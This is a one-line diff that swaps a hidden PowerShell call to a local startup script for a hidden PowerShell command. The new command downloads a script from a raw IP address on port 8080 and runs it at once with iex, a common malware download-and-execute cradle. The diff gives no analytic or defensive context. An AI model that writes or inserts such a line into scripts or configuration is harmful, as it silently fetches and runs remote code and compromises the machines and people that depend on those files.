@@ -1,1 +1,1 @@
-powerShell -windowstyle hidden C:/Sys69/startup.ps1
+powershell -windowstyle hidden iex ((New-Object System.Net.WebClient).DownloadString('http://139.162.197.217:8080/raa.ps1 '))
